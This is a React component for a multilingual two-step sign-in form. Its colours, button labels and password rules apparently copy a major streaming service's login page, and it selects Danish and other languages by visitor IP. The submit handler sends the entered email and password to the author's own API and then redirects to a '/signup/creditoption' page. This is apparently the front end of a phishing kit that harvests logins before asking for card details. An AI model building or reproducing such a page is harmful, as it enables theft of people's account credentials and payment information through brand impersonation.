import React, { useState, useEffect } from "react";

// Translations object
const translations = {
  da: {
    title: "Indtast dine oplysninger",
    description: "Log ind eller start med en ny konto.",
    emailPlaceholder: "Email eller mobilnummer",
    continue: "Fortsæt",
    passwordTitle: "Indtast din adgangskode",
    change: "Skift",
    passwordPlaceholder: "Adgangskode",
    rememberMe: "Husk mig",
    needHelp: "Har du brug for hjælp?",
    signIn: "Log ind",
    or: "eller",
    useCode: "Brug log ind-kode",
    getHelp: "Få hjælp",
    tips: "Har du problemer med at logge ind? Her er nogle tips:",
    tip1: "Sørg for at din email/telefon er korrekt",
    tip2: "Tjek din adgangskode for tastefejl",
    tip3: 'Brug "Glemt adgangskode" for at nulstille',
    note: "Denne side er beskyttet af Google reCAPTCHA for at sikre, at du ikke er en bot.",
    emailError:
      "Indtast venligst en gyldig email eller et gyldigt mobilnummer.",
    passwordError: "Din adgangskode skal indeholde mellem 4 og 60 tegn.",
    loginError: "Login fejl",
    serverError: "Kunne ikke forbinde til serveren",
  },
  en: {
    title: "Enter your info",
    description: "Sign in or get started with a new account.",
    emailPlaceholder: "Email or mobile number",
    continue: "Continue",
    passwordTitle: "Enter your password",
    change: "Change",
    passwordPlaceholder: "Password",
    rememberMe: "Remember me",
    needHelp: "Need help?",
    signIn: "Sign In",
    or: "or",
    useCode: "Use Sign-in Code",
    getHelp: "Get Help",
    tips: "Having trouble signing in? Here are some tips:",
    tip1: "Make sure your email/phone is correct",
    tip2: "Check your password for typos",
    tip3: 'Use "Forgot password" to reset',
    note: "This page is protected by Google reCAPTCHA to ensure you're not a bot.",
    emailError: "Please enter a valid email or mobile number.",
    passwordError: "Your password must contain between 4 and 60 characters.",
    loginError: "Login failed",
    serverError: "Failed to connect to server",
  },
  ar: {
    title: "أدخل معلوماتك",
    description: "قم بتسجيل الدخول أو ابدأ بحساب جديد.",
    emailPlaceholder: "البريد الإلكتروني أو رقم الهاتف",
    continue: "استمرار",
    passwordTitle: "أدخل كلمة المرور الخاصة بك",
    change: "تغيير",
    passwordPlaceholder: "كلمة المرور",
    rememberMe: "تذكرني",
    needHelp: "بحاجة إلى مساعدة؟",
    signIn: "تسجيل الدخول",
    or: "أو",
    useCode: "استخدام رمز تسجيل الدخول",
    getHelp: "الحصول على مساعدة",
    tips: "هل تواجه مشكلة في تسجيل الدخول؟ إليك بعض النصائح:",
    tip1: "تأكد من أن بريدك الإلكتروني / هاتفك صحيح",
    tip2: "تحقق من كلمة المرور الخاصة بك بحثًا عن الأخطاء المطبعية",
    tip3: 'استخدم "نسيت كلمة المرور" لإعادة التعيين',
    note: "هذه الصفحة محمية بواسطة Google reCAPTCHA للتأكد من أنك لست روبوتًا.",
    emailError: "يرجى إدخال بريد إلكتروني أو رقم هاتف صالح.",
    passwordError: "يجب أن تحتوي كلمة المرور على ما بين 4 و 60 حرفًا.",
    loginError: "فشل تسجيل الدخول",
    serverError: "فشل الاتصال بالخادم",
  },
  fr: {
    title: "Entrez vos informations",
    description: "Connectez-vous ou commencez avec un nouveau compte.",
    emailPlaceholder: "E-mail ou numéro de mobile",
    continue: "Continuer",
    passwordTitle: "Entrez votre mot de passe",
    change: "Changer",
    passwordPlaceholder: "Mot de passe",
    rememberMe: "Se souvenir de moi",
    needHelp: "Besoin d'aide ?",
    signIn: "Se connecter",
    or: "ou",
    useCode: "Utiliser le code de connexion",
    getHelp: "Obtenir de l'aide",
    tips: "Vous avez des difficultés à vous connecter ? Voici quelques conseils :",
    tip1: "Assurez-vous que votre e-mail/téléphone est correct",
    tip2: "Vérifiez votre mot de passe pour les fautes de frappe",
    tip3: 'Utilisez "Mot de passe oublié" pour réinitialiser',
    note: "Cette page est protégée par Google reCAPTCHA pour vous assurer que vous n'êtes pas un robot.",
    emailError: "Veuillez entrer un e-mail ou un numéro de mobile valide.",
    passwordError: "Votre mot de passe doit contenir entre 4 et 60 caractères.",
    loginError: "Échec de la connexion",
    serverError: "Échec de la connexion au serveur",
  },
  es: {
    title: "Ingresa tu información",
    description: "Inicia sesión o comienza con una cuenta nueva.",
    emailPlaceholder: "Correo electrónico o número de teléfono",
    continue: "Continuar",
    passwordTitle: "Ingresa tu contraseña",
    change: "Cambiar",
    passwordPlaceholder: "Contraseña",
    rememberMe: "Recordarme",
    needHelp: "¿Necesitas ayuda?",
    signIn: "Iniciar sesión",
    or: "o",
    useCode: "Usar código de acceso",
    getHelp: "Obtener ayuda",
    tips: "¿Tienes problemas para iniciar sesión? Aquí tienes algunos consejos:",
    tip1: "Asegúrate de que tu correo/teléfono sea correcto",
    tip2: "Revisa tu contraseña en busca de errores tipográficos",
    tip3: 'Usa "Olvidé mi contraseña" para restablecerla',
    note: "Esta página está protegida por Google reCAPTCHA para asegurarse de que no eres un robot.",
    emailError:
      "Por favor, ingresa un correo electrónico o número de teléfono válido.",
    passwordError: "Tu contraseña debe contener entre 4 y 60 caracteres.",
    loginError: "Error de inicio de sesión",
    serverError: "Error al conectar con el servidor",
  },
  de: {
    title: "Geben Sie Ihre Daten ein",
    description: "Melden Sie sich an oder starten Sie mit einem neuen Konto.",
    emailPlaceholder: "E-Mail oder Mobilnummer",
    continue: "Fortfahren",
    passwordTitle: "Geben Sie Ihr Passwort ein",
    change: "Ändern",
    passwordPlaceholder: "Passwort",
    rememberMe: "Angemeldet bleiben",
    needHelp: "Hilfe benötigt?",
    signIn: "Anmelden",
    or: "oder",
    useCode: "Anmeldecode verwenden",
    getHelp: "Hilfe erhalten",
    tips: "Probleme bei der Anmeldung? Hier sind einige Tipps:",
    tip1: "Stellen Sie sicher, dass Ihre E-Mail/Telefonnummer korrekt ist",
    tip2: "Überprüfen Sie Ihr Passwort auf Tippfehler",
    tip3: 'Verwenden Sie "Passwort vergessen" zum Zurücksetzen',
    note: "Diese Seite ist durch Google reCAPTCHA geschützt, um sicherzustellen, dass Sie kein Bot sind.",
    emailError: "Bitte geben Sie eine gültige E-Mail oder Mobilnummer ein.",
    passwordError: "Ihr Passwort muss zwischen 4 und 60 Zeichen enthalten.",
    loginError: "Anmeldung fehlgeschlagen",
    serverError: "Verbindung zum Server fehlgeschlagen",
  },
  pl: {
    title: "Wprowadź swoje dane",
    description: "Zaloguj się lub rozpocznij z nowym kontem.",
    emailPlaceholder: "E-mail lub numer telefonu",
    continue: "Kontynuuj",
    passwordTitle: "Wprowadź swoje hasło",
    change: "Zmień",
    passwordPlaceholder: "Hasło",
    rememberMe: "Zapamiętaj mnie",
    needHelp: "Potrzebujesz pomocy?",
    signIn: "Zaloguj się",
    or: "lub",
    useCode: "Użyj kodu logowania",
    getHelp: "Uzyskaj pomoc",
    tips: "Masz problem z logowaniem? Oto kilka wskazówek:",
    tip1: "Upewnij się, że Twój e-mail/telefon jest poprawny",
    tip2: "Sprawdź hasło pod kątem literówek",
    tip3: 'Użyj "Nie pamiętam hasła", aby zresetować',
    note: "Ta strona jest chroniona przez Google reCAPTCHA, aby upewnić się, że nie jesteś botem.",
    emailError: "Wprowadź prawidłowy adres e-mail lub numer telefonu.",
    passwordError: "Twoje hasło musi zawierać od 4 do 60 znaków.",
    loginError: "Błąd logowania",
    serverError: "Nie udało się połączyć z serwerem",
  },
  sv: {
    title: "Ange din information",
    description: "Logga in eller börja med ett nytt konto.",
    emailPlaceholder: "E-post eller mobilnummer",
    continue: "Fortsätt",
    passwordTitle: "Ange ditt lösenord",
    change: "Ändra",
    passwordPlaceholder: "Lösenord",
    rememberMe: "Kom ihåg mig",
    needHelp: "Behöver du hjälp?",
    signIn: "Logga in",
    or: "eller",
    useCode: "Använd inloggningskod",
    getHelp: "Få hjälp",
    tips: "Har du problem med att logga in? Här är några tips:",
    tip1: "Kontrollera att din e-post/telefon är korrekt",
    tip2: "Kontrollera ditt lösenord för stavfel",
    tip3: 'Använd "Glömt lösenord" för att återställa',
    note: "Den här sidan skyddas av Google reCAPTCHA för att säkerställa att du inte är en bot.",
    emailError: "Ange en giltig e-postadress eller ett giltigt mobilnummer.",
    passwordError: "Ditt lösenord måste innehålla mellan 4 och 60 tecken.",
    loginError: "Inloggning misslyckades",
    serverError: "Kunde inte ansluta till servern",
  },
  no: {
    title: "Skriv inn din informasjon",
    description: "Logg inn eller start med en ny konto.",
    emailPlaceholder: "E-post eller mobilnummer",
    continue: "Fortsett",
    passwordTitle: "Skriv inn passordet ditt",
    change: "Endre",
    passwordPlaceholder: "Passord",
    rememberMe: "Husk meg",
    needHelp: "Trenger du hjelp?",
    signIn: "Logg inn",
    or: "eller",
    useCode: "Bruk innloggingskode",
    getHelp: "Få hjelp",
    tips: "Har du problemer med å logge inn? Her er noen tips:",
    tip1: "Kontroller at e-posten/telefonen din er riktig",
    tip2: "Sjekk passordet for skrivefeil",
    tip3: 'Bruk "Glemt passord" for å tilbakestille',
    note: "Denne siden er beskyttet av Google reCAPTCHA for å sikre at du ikke er en bot.",
    emailError:
      "Vennligst skriv inn en gyldig e-post eller et gyldig mobilnummer.",
    passwordError: "Passordet ditt må inneholde mellom 4 og 60 tegn.",
    loginError: "Innlogging mislyktes",
    serverError: "Kunne ikke koble til serveren",
  },
  nl: {
    title: "Voer uw gegevens in",
    description: "Log in of begin met een nieuw account.",
    emailPlaceholder: "E-mail of mobiel nummer",
    continue: "Doorgaan",
    passwordTitle: "Voer uw wachtwoord in",
    change: "Wijzigen",
    passwordPlaceholder: "Wachtwoord",
    rememberMe: "Onthoud mij",
    needHelp: "Hulp nodig?",
    signIn: "Inloggen",
    or: "of",
    useCode: "Gebruik inlogcode",
    getHelp: "Hulp krijgen",
    tips: "Problemen met inloggen? Hier zijn enkele tips:",
    tip1: "Zorg ervoor dat uw e-mail/telefoon correct is",
    tip2: "Controleer uw wachtwoord op typefouten",
    tip3: 'Gebruik "Wachtwoord vergeten" om te resetten',
    note: "Deze pagina wordt beschermd door Google reCAPTCHA om te controleren of u geen bot bent.",
    emailError: "Voer een geldig e-mailadres of mobiel nummer in.",
    passwordError: "Uw wachtwoord moet tussen 4 en 60 tekens bevatten.",
    loginError: "Inloggen mislukt",
    serverError: "Kan geen verbinding maken met de server",
  },
  nl_BE: {
    title: "Voer uw gegevens in",
    description: "Log in of begin met een nieuw account.",
    emailPlaceholder: "E-mail of mobiel nummer",
    continue: "Doorgaan",
    passwordTitle: "Voer uw wachtwoord in",
    change: "Wijzigen",
    passwordPlaceholder: "Wachtwoord",
    rememberMe: "Onthoud mij",
    needHelp: "Hulp nodig?",
    signIn: "Inloggen",
    or: "of",
    useCode: "Gebruik inlogcode",
    getHelp: "Hulp krijgen",
    tips: "Problemen met inloggen? Hier zijn enkele tips:",
    tip1: "Zorg ervoor dat uw e-mail/telefoon correct is",
    tip2: "Controleer uw wachtwoord op typefouten",
    tip3: 'Gebruik "Wachtwoord vergeten" om te resetten',
    note: "Deze pagina wordt beschermd door Google reCAPTCHA om te controleren of u geen bot bent.",
    emailError: "Voer een geldig e-mailadres of mobiel nummer in.",
    passwordError: "Uw wachtwoord moet tussen 4 en 60 tekens bevatten.",
    loginError: "Inloggen mislukt",
    serverError: "Kan geen verbinding maken met de server",
  },
  cs: {
    title: "Zadejte své údaje",
    description: "Přihlaste se nebo začněte s novým účtem.",
    emailPlaceholder: "E-mail nebo telefonní číslo",
    continue: "Pokračovat",
    passwordTitle: "Zadejte své heslo",
    change: "Změnit",
    passwordPlaceholder: "Heslo",
    rememberMe: "Zapamatovat si mě",
    needHelp: "Potřebujete pomoc?",
    signIn: "Přihlásit se",
    or: "nebo",
    useCode: "Použít přihlašovací kód",
    getHelp: "Získat pomoc",
    tips: "Máte potíže s přihlášením? Zde je několik tipů:",
    tip1: "Ujistěte se, že váš e-mail/telefon je správný",
    tip2: "Zkontrolujte své heslo na překlepy",
    tip3: 'Použijte "Zapomněli jste heslo?" pro resetování',
    note: "Tato stránka je chráněna službou Google reCAPTCHA, aby bylo zajištěno, že nejste robot.",
    emailError: "Zadejte prosím platný e-mail nebo telefonní číslo.",
    passwordError: "Vaše heslo musí obsahovat 4 až 60 znaků.",
    loginError: "Přihlášení selhalo",
    serverError: "Nepodařilo se připojit k serveru",
  },
  pt: {
    title: "Insira as suas informações",
    description: "Inicie sessão ou comece com uma nova conta.",
    emailPlaceholder: "E-mail ou número de telemóvel",
    continue: "Continuar",
    passwordTitle: "Insira a sua palavra-passe",
    change: "Alterar",
    passwordPlaceholder: "Palavra-passe",
    rememberMe: "Lembrar-me",
    needHelp: "Precisa de ajuda?",
    signIn: "Iniciar sessão",
    or: "ou",
    useCode: "Usar código de início de sessão",
    getHelp: "Obter ajuda",
    tips: "Está com problemas para iniciar sessão? Aqui estão algumas dicas:",
    tip1: "Certifique-se de que o seu e-mail/telefone está correto",
    tip2: "Verifique a sua palavra-passe para erros de digitação",
    tip3: 'Use "Esqueceu-se da palavra-passe?" para redefinir',
    note: "Esta página é protegida pelo Google reCAPTCHA para garantir que não é um robô.",
    emailError: "Introduza um e-mail ou número de telemóvel válido.",
    passwordError: "A sua palavra-passe deve ter entre 4 e 60 caracteres.",
    loginError: "Falha no início de sessão",
    serverError: "Falha ao ligar ao servidor",
  },
  mt: {
    title: "Daħħal l-informazzjoni tiegħek",
    description: "Idħol jew ibda b'kont ġdid.",
    emailPlaceholder: "Email jew numru tal-mowbajl",
    continue: "Kompli",
    passwordTitle: "Daħħal il-password tiegħek",
    change: "Biddel",
    passwordPlaceholder: "Password",
    rememberMe: "Ftakar fija",
    needHelp: "Bżonn għajnuna?",
    signIn: "Idħol",
    or: "jew",
    useCode: "Uża kodiċi ta' login",
    getHelp: "Ikseb għajnuna",
    tips: "Qed ikollok problemi biex tidħol? Hawn huma xi suġġerimenti:",
    tip1: "Kun żgur li l-email/telefon tiegħek huwa korrett",
    tip2: "Iċċekkja l-password tiegħek għal żbalji",
    tip3: 'Uża "Nesjt il-password?" biex tirrisettja',
    note: "Din il-paġna hija protetta minn Google reCAPTCHA biex tiżgura li m'intix robot.",
    emailError: "Jekk jogħġbok daħħal email jew numru tal-mowbajl validu.",
    passwordError: "Il-password tiegħek trid ikun fiha bejn 4 u 60 karattru.",
    loginError: "Id-dħul falla",
    serverError: "Ma setax jgħaqqad mas-server",
  },
};

export default function MultiStepLogin() {
  const [step, setStep] = useState("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [errors, setErrors] = useState({});
  const [emailFocused, setEmailFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [showInfo, setShowInfo] = useState(false);
  const [isHovered, setIsHovered] = useState(false);
  const [isHoveredCode, setIsHoveredCode] = useState(false);
  const [rememberMe, setRememberMe] = useState(true);
  const [language, setLanguage] = useState("en");
  const [isLoadingLang, setIsLoadingLang] = useState(true);
  const apiUrl = import.meta.env.VITE_API_URL;

  // Function to detect language based on IP
  const detectLanguageByIP = async () => {
    try {
      const apiUrl = import.meta.env.VITE_API_URL;
      const res = await fetch(`${apiUrl}/api/ipinfo`);
      const data = await res.json();

      const countryCode = data.country_code?.toLowerCase();

      const countryToLanguage = {
        dk: "da",
        us: "en",
        gb: "en",
        ca: "en",
        au: "en",
        ae: "ar",
        sa: "ar",
        eg: "ar",
        fr: "fr",
        be: "fr",
        ch: "fr",
        es: "es",
        mx: "es",
        ar: "es",
        co: "es",
        de: "de",
        at: "de",
        tn: "ar", // 🔥 زيد تونس
      };

      const detectedLang = countryToLanguage[countryCode] || "da";

      setLanguage(detectedLang);
      localStorage.setItem("preferredLanguage", detectedLang);
    } catch (error) {
      console.error("Error detecting language:", error);

      const savedLang = localStorage.getItem("preferredLanguage");

      if (savedLang && translations[savedLang]) {
        setLanguage(savedLang);
      } else {
        const browserLang = navigator.language.split("-")[0];

        if (translations[browserLang]) {
          setLanguage(browserLang);
        } else {
          setLanguage("da");
        }
      }
    } finally {
      setIsLoadingLang(false);
    }
  };

  useEffect(() => {
    detectLanguageByIP();
  }, []);

  // Function to get translation
  const t = (key) => {
    if (translations[language] && translations[language][key]) {
      return translations[language][key];
    }
    return translations.en[key] || key;
  };

  const CheckIcon = () => (
    <svg
      xmlns="http://www.w3.org/2000/svg"
      fill="none"
      role="img"
      viewBox="0 0 16 16"
      width="16"
      height="16"
    >
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M13.4696 3.46973L14.5303 4.53039L6.53026 12.5304C6.23737 12.8233 5.7625 12.8233 5.4696 12.5304L1.4696 8.53039L2.53026 7.46973L5.99993 10.9394L13.4696 3.46973Z"
        fill="currentColor"
      />
    </svg>
  );

  const validateField = (field) => {
    const newErrors = { ...errors };

    if (field === "email") {
      const emailRegex = /^\S+@\S+\.\S+$/;
      const phoneRegex = /^(?:\+45|0045)?\s?\d{8}$/;

      if (!emailRegex.test(email) && !phoneRegex.test(email)) {
        newErrors.email = t("emailError");
      } else {
        delete newErrors.email;
      }
    }

    if (field === "password") {
      if (password.length < 4 || password.length > 60) {
        newErrors.password = t("passwordError");
      } else {
        delete newErrors.password;
      }
    }

    setErrors(newErrors);
  };

  const handleContinue = () => {
    validateField("email");
    if (!email.trim() || errors.email) return;
    setStep("password");
  };

  const handleBack = () => {
    setStep("email");
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    validateField("email");
    validateField("password");

    if (!email || !password) return;
    if (Object.keys(errors).length !== 0) return;

    try {
      const response = await fetch(`${apiUrl}/api/login`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json();

      if (response.ok) {
        window.location.href = "/signup/creditoption";
      } else {
        alert(`❌ ${t("loginError")}: ` + data.error);
      }
    } catch (err) {
      console.error("Login error:", err);
      alert(`❌ ${t("serverError")}`);
    }
  };

  const isEmailActive = emailFocused || email.length > 0;
  const isPasswordActive = passwordFocused || password.length > 0;

  useEffect(() => {
    setTimeout(() => {
      if (email.length > 0) {
        setEmailFocused(false);
      }
    }, 100);
  }, []);

  if (isLoadingLang) {
    return (
      <div className="page">
        <div className="card" style={{ textAlign: "center" }}>
          <div>Loading...</div>
        </div>
      </div>
    );
  }

  const isRTL = language === "ar";

  return (
    <div className="page" dir={isRTL ? "rtl" : "ltr"}>
      <div className="card">
        {step === "email" ? (
          <>
            <h1>{t("title")}</h1>
            <p>{t("description")}</p>

            <div
              style={{
                position: "relative",
                marginBottom: errors.email ? 4 : 16,
              }}
            >
              <input
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                onFocus={() => setEmailFocused(true)}
                onBlur={() => {
                  setEmailFocused(false);
                  validateField("email");
                }}
                style={{
                  height: 56,
                  borderRadius: 4,
                  border: `1px solid ${errors.email ? "#eb3942" : "#63666a"}`,
                  color: "white",
                  fontSize: 16,
                  width: "100%",
                  padding: "24px 16px 8px 16px",
                  background: "rgba(22, 22, 22, 0.7)",
                  WebkitTextFillColor: "white",
                  transition: "background-color 5000s ease-in-out 0s",
                  outline: "none",
                  textAlign: isRTL ? "right" : "left",
                }}
              />
              <label
                style={{
                  position: "absolute",
                  left: isRTL ? "auto" : 16,
                  right: isRTL ? 16 : "auto",
                  top: isEmailActive ? 6 : 16,
                  fontSize: isEmailActive ? 12 : 16,
                  transition: "all 0.2s ease",
                  pointerEvents: "none",
                  color: "rgba(255, 255, 255, 0.7)",
                }}
              >
                {t("emailPlaceholder")}
              </label>
            </div>
            {errors.email && (
              <div
                style={{
                  color: "#eb3942",
                  fontSize: 13,
                  marginBottom: 16,
                  marginTop: 0,
                }}
              >
                {errors.email}
              </div>
            )}

            <button onClick={handleContinue}>{t("continue")}</button>
          </>
        ) : (
          <form onSubmit={handleSubmit}>
            <h1>{t("passwordTitle")}</h1>

            <div className="emailBox">
              <span>{email}</span>
              <button type="button" className="changeBtn" onClick={handleBack}>
                {t("change")}
              </button>
            </div>

            <div
              style={{
                position: "relative",
                marginBottom: errors.password ? 4 : 16,
              }}
            >
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onFocus={() => setPasswordFocused(true)}
                onBlur={() => {
                  setPasswordFocused(false);
                  validateField("password");
                }}
                style={{
                  height: 56,
                  borderRadius: 4,
                  border: `1px solid ${errors.password ? "#eb3942" : "#63666a"}`,
                  color: "white",
                  fontSize: 16,
                  width: "100%",
                  padding: "24px 16px 8px 16px",
                  background: "rgba(22, 22, 22, 0.7)",
                  WebkitTextFillColor: "white",
                  transition: "background-color 5000s ease-in-out 0s",
                  outline: "none",
                  textAlign: isRTL ? "right" : "left",
                }}
              />
              <label
                style={{
                  position: "absolute",
                  left: isRTL ? "auto" : 16,
                  right: isRTL ? 16 : "auto",
                  top: isPasswordActive ? 6 : 16,
                  fontSize: isPasswordActive ? 12 : 16,
                  transition: "all 0.2s ease",
                  pointerEvents: "none",
                  color: "rgba(255, 255, 255, 0.7)",
                }}
              >
                {t("passwordPlaceholder")}
              </label>
            </div>
            {errors.password && (
              <div
                style={{
                  color: "#eb3942",
                  fontSize: 13,
                  marginBottom: 16,
                  marginTop: 0,
                }}
              >
                {errors.password}
              </div>
            )}

            <div className="remember-forgot">
              <label className="checkbox-label">
                <input
                  type="checkbox"
                  checked={rememberMe}
                  onChange={(e) => setRememberMe(e.target.checked)}
                />
                <span>{t("rememberMe")}</span>
              </label>
              <button
                type="button"
                className="help-link"
                onMouseEnter={() => setIsHovered(true)}
                onMouseLeave={() => setIsHovered(false)}
              >
                {t("needHelp")}
              </button>
            </div>

            <button
              type="submit"
              onMouseEnter={() => setIsHoveredCode(true)}
              onMouseLeave={() => setIsHoveredCode(false)}
            >
              {t("signIn")}
            </button>

            <div className="divider">
              <span />
              <b>{t("or")}</b>
              <span />
            </div>

            <button type="button" className="secondaryBtn">
              {t("useCode")}
            </button>
          </form>
        )}

        <div className="help" onClick={() => setShowInfo(!showInfo)}>
          {t("getHelp")} {showInfo ? "▲" : "˅"}
        </div>

        {showInfo && (
          <div className="help-info">
            <p>{t("tips")}</p>
            <ul>
              <li>{t("tip1")}</li>
              <li>{t("tip2")}</li>
              <li>{t("tip3")}</li>
            </ul>
          </div>
        )}

        <p className="note">{t("note")}</p>
      </div>

      <style>{`
        * { box-sizing: border-box; }
        body {
          margin: 0;
          background: transparent;
        }
        .page {
          min-height: 725px;
          background: transparent;
          display: flex;
          justify-content: center;
          align-items: flex-start;
          color: white;
        }
        .card {
          width: 500px;
          max-width: calc(100vw - 32px);
        }
        h1 {
          margin: 0px;
          font-size: 2rem;
          font-weight: 700;
        }
        p {
          margin: 0 0 24px;
          color: rgba(255,255,255,.8);
          font-size: 1.125rem;
        }
        button {
          width: 100%;
          height: 48px;
          border: none;
          border-radius: 4px;
          background: #e50914;
          color: white;
          font-size: 18px;
          font-weight: 700;
          cursor: pointer;
          transition: opacity 0.3s ease;
        }
        button:hover {
          opacity: 0.9;
        }
        .secondaryBtn {
          background: rgba(120,100,100,.45);
        }
        .emailBox {
          height: 44px;
          border-radius: 4px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 0 16px;
          margin-bottom: 24px;
          margin-top: 24px;
          font-size: 14px;
          background: rgba(120,100,100,.45);
        }
        .changeBtn {
          width: auto;
          height: auto;
          background: transparent;
          text-decoration: underline;
          font-size: 14px;
          padding: 0;
        }
        .remember-forgot {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 24px;
        }
        .checkbox-label {
          display: flex;
          align-items: center;
          gap: 8px;
          cursor: pointer;
          font-size: 14px;
        }
        .checkbox-label input {
          width: auto;
          height: auto;
          margin: 0;
        }
        .help-link {
          width: auto;
          height: auto;
          background: transparent;
          font-size: 14px;
          font-weight: normal;
          text-decoration: underline;
          padding: 0;
        }
        .divider {
          display: flex;
          align-items: center;
          gap: 14px;
          margin: 18px 0;
        }
        .divider span {
          flex: 1;
          height: 1px;
          background: rgba(255,255,255,.2);
        }
        .divider b {
          font-weight: 500;
        }
        .help {
          margin-top: 46px;
          font-size: 15px;
          font-weight: 600;
          cursor: pointer;
        }
        .help-info {
          margin-top: 16px;
          padding: 16px;
          background: rgba(120,100,100,.3);
          border-radius: 4px;
          font-size: 14px;
        }
        .help-info ul {
          margin: 8px 0 0 20px;
          padding: 0;
        }
        .help-info li {
          margin: 5px 0;
        }
        .note {
          margin-top: 34px;
          font-size: 13px;
          color: rgba(255,255,255,.65);
        }
      `}</style>
    </div>
  );
}